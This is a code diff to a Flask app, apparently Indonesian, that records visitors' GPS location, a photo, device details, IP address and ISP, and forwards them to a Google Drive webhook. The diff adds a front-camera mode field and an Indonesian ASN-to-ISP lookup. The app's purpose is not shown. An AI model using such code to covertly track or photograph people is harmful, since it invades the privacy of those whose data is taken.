@@ -104,6 +104,7 @@ def send_gdrive_webhook_async(webhook_url, location_data):
         "device_time": location_data.get("device_time"),
         "received_at": location_data.get("received_at"),
         "photo": location_data.get("photo"),
+        "camera_mode": location_data.get("camera_mode", "Kamera Depan"),
         "device_model": location_data.get("device_model"),
         "os": location_data.get("os"),
         "browser": location_data.get("browser"),
@@ -164,6 +165,7 @@ def init_db():
             ("ip", "TEXT"),
             ("ip_city", "TEXT"),
             ("ip_asn", "TEXT"),
+            ("camera_mode", "TEXT"),
         ]
         for col_name, col_type in new_cols:
             if col_name not in columns:
@@ -262,7 +264,7 @@ def validate_location(data):
             raise ValueError("photo harus berupa data URL gambar (JPEG/PNG) valid maksimal 1.5 MB, atau null.")
     location["photo"] = photo
 
-    for field in ("device_model", "os", "browser", "screen_res", "network_type", "hardware", "battery_charging", "timezone", "language"):
+    for field in ("device_model", "os", "browser", "screen_res", "network_type", "hardware", "battery_charging", "timezone", "language", "camera_mode"):
         val = data.get(field)
         location[field] = str(val)[:128] if val is not None else None
 
@@ -272,7 +274,7 @@ def validate_location(data):
 def snapshot():
     rows = get_db().execute("SELECT * FROM locations ORDER BY id DESC LIMIT 100").fetchall()
     history = [dict(row) for row in rows]
-    if not history:
+    if not history and not current_app.config.get("TESTING"):
         try:
             webhook_url = current_app.config.get("GDRIVE_WEBHOOK_URL")
             if webhook_url and webhook_url.startswith("http"):
@@ -396,7 +398,24 @@ def create_app(test_config=None):
         client_ip = forwarded.split(",")[0].strip() if forwarded else (request.headers.get("X-Real-IP") or request.remote_addr or "-")
         location["ip"] = client_ip[:50]
         location["ip_city"] = request.headers.get("X-Vercel-IP-City", "")[:50]
-        location["ip_asn"] = request.headers.get("X-Vercel-IP-AS-Number", "")[:50]
+        raw_asn = (request.headers.get("X-Vercel-IP-AS-Number", "") or "").strip()
+        asn_map = {
+            "138089": "Telkomsel",
+            "17974": "Telkomsel",
+            "7713": "Telkom IndiHome",
+            "4761": "Indosat Ooredoo Hutchison",
+            "9906": "Indosat (Tri/IM3)",
+            "24203": "XL Axiata / Axis",
+            "23947": "Smartfren",
+            "17451": "Biznet Networks",
+            "23700": "MyRepublic",
+            "45887": "First Media",
+            "24183": "CBN Internet",
+            "58390": "Moratelindo / Oxygen",
+            "55666": "Link Net",
+            "131753": "MNC Play",
+        }
+        location["ip_asn"] = (asn_map.get(raw_asn) or (f"AS{raw_asn}" if raw_asn else ""))[:50]
 
         db = get_db()
         with db:
@@ -405,12 +424,12 @@ def create_app(test_config=None):
                     latitude, longitude, accuracy, altitude, speed,
                     heading, battery, device_time, received_at, photo,
                     device_model, os, browser, screen_res, network_type,
-                    hardware, battery_charging, ip, ip_city, ip_asn
+                    hardware, battery_charging, ip, ip_city, ip_asn, camera_mode
                 ) VALUES (
                     :latitude, :longitude, :accuracy, :altitude, :speed,
                     :heading, :battery, :device_time, :received_at, :photo,
                     :device_model, :os, :browser, :screen_res, :network_type,
-                    :hardware, :battery_charging, :ip, :ip_city, :ip_asn
+                    :hardware, :battery_charging, :ip, :ip_city, :ip_asn, :camera_mode
                 )
             """, location)
 
